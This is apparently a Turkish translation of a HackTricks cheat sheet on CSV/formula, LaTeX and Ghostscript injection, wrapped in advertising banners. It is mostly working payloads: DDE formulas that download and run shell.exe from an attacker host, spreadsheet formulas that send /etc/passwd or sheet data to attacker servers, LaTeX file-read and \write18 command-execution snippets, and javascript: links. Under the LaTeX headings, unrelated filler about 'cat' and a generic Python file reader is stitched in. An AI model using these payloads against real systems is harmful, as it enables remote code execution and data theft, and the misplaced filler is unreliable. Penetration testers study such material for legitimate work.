# Formül/CSV/Döküman/LaTeX/GhostScript Enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Formül Enjeksiyonu

### Bilgi

Eğer **girdiniz**, **CSV dosyaları**nda (veya muhtemelen **Excel** tarafından açılacak başka bir dosyada) **yansıtılıyorsa**, Excel sayfasını **açtığında** veya kullanıcı **bazı bağlantılara tıkladığında** çalıştırılacak Excel **formülleri** ekleyebilirsiniz.

{% hint style="danger" %}
Günümüzde, Excel, kullanıcının kötü niyetli eylemlerden korunmak için, Excel dışından bir şey yüklendiğinde kullanıcıya (birkaç kez) **uyarıda bulunur**. Bu nedenle, son saldırı yükü için özel bir Sosyal Mühendislik çabası gereklidir.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**Aşağıdaki örnek, son excel tablosundan içeriği dışarı çıkarmak ve keyfi konumlara istekler yapmak için çok kullanışlıdır. Ancak, kullanıcının bağlantıya tıklaması (ve uyarıları kabul etmesi) gerekmektedir.**

Aşağıdaki örnek [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) adresinden alınmıştır.

Bir Öğrenci Kayıt Yönetim sistemindeki bir güvenlik açığı, CSV enjeksiyon saldırısıyla sömürülür. Saldırganın temel amacı, öğretmenlerin öğrenci detaylarını yönetmek için kullandığı sistemi tehlikeye atmak. Saldırı aşağıdaki gibi gerçekleşir:

1. **Zararlı Yükün Enjekte Edilmesi:**
- Saldırgan, öğrenci detay formunu gönderirken, elektronik tablolarda yaygın olarak kullanılan bir formülü (örneğin, `=HYPERLINK("<zararlı_bağlantı>","Buraya tıklayın")`) dahil eder.
- Bu formül, bir bağlantı oluşturmak için tasarlanmıştır, ancak saldırgan tarafından kontrol edilen zararlı bir sunucuya işaret eder.

2. **Kompromize Edilmiş Verinin Dışa Aktarılması:**
- Kompromis farkında olmayan öğretmenler, verileri bir CSV dosyasına aktarmak için uygulamanın işlevselliğini kullanır.
- CSV dosyası, açıldığında hala zararlı yük içerir. Bu yük, elektronik tabloda tıklanabilir bir bağlantı olarak görünür.

3. **Saldırının Tetiklenmesi:**
- Bir öğretmen, öğrenci detaylarının meşru bir parçası olduğuna inanarak bağlantıya tıklar.
- Tıkladıktan sonra, hassas veriler (potansiyel olarak elektronik tablodan veya öğretmenin bilgisayarından ayrıntılar) saldırganın sunucusuna iletilir.

4. **Verilerin Kaydedilmesi:**
- Saldırganın sunucusu, öğretmenin bilgisayarından gönderilen hassas verileri alır ve kaydeder.
- Saldırgan daha sonra bu verileri çeşitli kötü niyetli amaçlar için kullanabilir, öğrencilerin ve kurumun gizliliğini ve güvenliğini daha da tehlikeye atarak.

### RCE

**Daha fazla ayrıntı için [orijinal yayına](https://notsosecure.com/data-exfiltration-formula-injection-part1) bakın.**

Belirli yapılandırmalarda veya eski sürümlerde, Excel'in Dynamic Data Exchange (DDE) adlı bir özelliği keyfi komutları yürütmek için sömürülebilir. Bunun için aşağıdaki ayarların etkinleştirilmesi gerekmektedir:

- Dosya → Seçenekler → Güven Merkezi → Güven Merkezi Ayarları → Harici İçerik'e gidin ve **Dynamic Data Exchange Server Launch**'ı etkinleştirin.

Zararlı yük içeren bir elektronik tablo açıldığında (ve kullanıcı uyarıları kabul ederse), zararlı yük yürütülür. Örneğin, hesap makinesi uygulamasını başlatmak için zararlı yük şu şekilde olacaktır:
```markdown
`=cmd|' /C calc'!xxx`
```
Ek komutlar da çalıştırılabilir, örneğin PowerShell kullanarak bir dosya indirip çalıştırmak:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LibreOffice Calc'ta Yerel Dosya Dahil Etme (LFI)

LibreOffice Calc, yerel dosyaları okumak ve veri sızdırmak için kullanılabilir. İşte bazı yöntemler:

- Yerel `/etc/passwd` dosyasından ilk satırı okuma: `='file:///etc/passwd'#$passwd.A1`
- Okunan verileri saldırgan tarafından kontrol edilen bir sunucuya sızdırma: `=WEBSERVICE(CONCATENATE("http://<saldırgan IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- Birden fazla satırı sızdırma: `=WEBSERVICE(CONCATENATE("http://<saldırgan IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- DNS sızdırma (okunan verileri saldırgan tarafından kontrol edilen bir DNS sunucusuna DNS sorguları olarak gönderme): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<saldırgan alan adı>"))`

### Out-of-Band (OOB) Veri Sızdırma için Google Sheets

Google Sheets, OOB veri sızdırma için istismar edilebilecek işlevler sunar:

- **CONCATENATE**: Dizeleri birleştirir - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: Yapılandırılmış veri türlerinden veri alır - `=IMPORTXML(CONCAT("http://<saldırgan IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: RSS veya ATOM beslemelerini alır - `=IMPORTFEED(CONCAT("http://<saldırgan IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: HTML tablolarından veya listelerinden veri alır - `=IMPORTHTML (CONCAT("http://<saldırgan IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: Başka bir elektronik tablodan hücre aralığı alır - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
- **IMAGE**: Bir hücreye bir resim ekler - `=IMAGE("https://<saldırgan IP:Port>/images/srpr/logo3w.png")`


## LaTeX Enjeksiyonu

Genellikle internet üzerinde bulunan **LaTeX kodunu PDF'ye dönüştüren sunucular** **`pdflatex`** kullanır.\
Bu program, komut yürütme işlemini (devre dışı bırakmak) veya (etkinleştirmek) için 3 ana özelliği kullanır:

* **`--no-shell-escape`**: `\write18{command}` yapısını devre dışı bırakır, hatta texmf.cnf dosyasında etkinleştirilmiş olsa bile.
* **`--shell-restricted`**: `--shell-escape` ile aynıdır, ancak 'güvenli' bir dizi **önceden tanımlanmış** komutlarla **sınırlıdır** (\*\*Ubuntu 16.04'te liste `/usr/share/texmf/web2c/texmf.cnf` dosyasında bulunur).
* **`--shell-escape`**: `\write18{command}` yapısını etkinleştirir. Komut herhangi bir kabuk komutu olabilir. Bu yapı normalde güvenlik nedenleriyle yasaklanmıştır.

Ancak, komutları yürütmek için başka yollar vardır, bu nedenle Uzaktan Komut Yürütme'yi önlemek için `--shell-restricted` kullanmak çok önemlidir.

### Dosya Okuma <a href="#read-file" id="read-file"></a>

Enjeksiyonu \[ veya $ gibi sarmalayıcılarla ayarlamak gerekebilir.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Tek satırlık dosya okuma

```bash
cat file.txt
```

Bu komut, `file.txt` adlı dosyanın içeriğini tek bir satırda okur ve terminale yazdırır.
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Çok satırlı dosya okuma

Bir dosyanın birden çok satırını okumak için aşağıdaki adımları izleyin:

1. Dosyayı açın ve okuma modunda açık tutun.
2. Dosyanın içeriğini satır satır okuyun.
3. Her satırı işleyin veya kullanın.

Aşağıda Python dilinde bir örnek bulunmaktadır:

```python
with open('dosya.txt', 'r') as dosya:
    satirlar = dosya.readlines()
    for satir in satirlar:
        # Satırı işleyin veya kullanın
        print(satir)
```

Bu kod, "dosya.txt" adlı dosyayı okur ve her satırı ekrana yazdırır. İşlem yapmak istediğiniz her satır için uygun kodu ekleyebilirsiniz.
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Dosya yazma <a href="#dosya-yazma" id="dosya-yazma"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Komut yürütme <a href="#komut-yürütme" id="komut-yürütme"></a>

Komutun girdisi stdin'e yönlendirilecek, bunu almak için geçici bir dosya kullanın.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Eğer herhangi bir LaTex hatası alırsanız, sonucu kötü karakterler olmadan elde etmek için base64 kullanmayı düşünün.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) tarafından yapılan bir paylaşımdan alıntıdır.
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Enjeksiyonu

**[https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/) adresini kontrol edin.**

## Referanslar

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin.**
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
